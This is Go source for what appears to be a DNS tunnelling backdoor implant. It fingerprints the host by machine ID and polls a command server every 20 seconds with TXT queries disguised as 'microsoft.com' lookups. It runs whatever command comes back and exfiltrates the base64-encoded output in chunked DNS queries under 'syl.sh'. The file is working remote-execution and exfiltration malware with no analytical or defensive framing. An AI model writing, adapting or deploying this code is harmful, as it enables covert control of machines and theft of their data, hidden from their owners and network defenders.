package main

import (
	"encoding/base64"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/denisbrodbeck/machineid"
	"github.com/miekg/dns"
)

const (
	host        = "127.0.0.1:8053"
	maxMsgLen   = 66
	metaInfoLen = 20
	beaconTime  = 20 * time.Second
)

// QueryStrings META
const (
	machineIdQs    = "mid="
	outputQs       = "o="
	chunkLenQs     = "cs="
	currentChunkQs = "cc="
)

func main() {
	machineId, _ := machineid.ID()
	messageFormat := fmt.Sprintf("microsoft.com?mid=%s.", machineId)
	m := new(dns.Msg)
	m.SetQuestion(messageFormat, dns.TypeTXT)

	for {
		r, _ := dns.Exchange(m, host)
		if r != nil {
			for _, a := range r.Answer {
				if txt, ok := a.(*dns.TXT); ok {
					cmd := strings.Split(txt.Txt[0], " ")
					cmdToExecute := cmd[0]
					cmdArgs := cmd[0:]
					fmt.Printf("cmd: %s\n", cmdToExecute)
					// Execute and Encode the received command
					out, err := exec.Command(cmdToExecute, cmdArgs...).Output()
					if err != nil {
						fmt.Println(err)
					}
					outEnc := base64.StdEncoding.EncodeToString(out)

					baseUrl := "syl.sh"

					// Add Machine Id
					baseUrl = baseUrl + "?" + machineIdQs + machineId[:4]
					nm := new(dns.Msg)

					// Add Space for META inf
					dataLeft := (maxMsgLen - len(baseUrl)) - metaInfoLen

					chunks := Chunks(outEnc, dataLeft)
					for i, chunkOut := range chunks {
						chunkLen := strconv.Itoa(len(chunks))
						currentChunk := strconv.Itoa((i + 1))

						// Build the Chunk URL
						chunkUrl := baseUrl +
							"&" + chunkLenQs + chunkLen +
							"&" + currentChunkQs + currentChunk +
							"&" + outputQs + chunkOut +
							"."

						fmt.Println(chunkUrl)
						nm.SetQuestion(chunkUrl, dns.TypeTXT)
						_, err := dns.Exchange(nm, host)
						if err != nil {
							fmt.Printf("%s err\n", err)
						}
					}
				}
			}
		}

		time.Sleep(beaconTime)
	}
}

func Chunks(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}
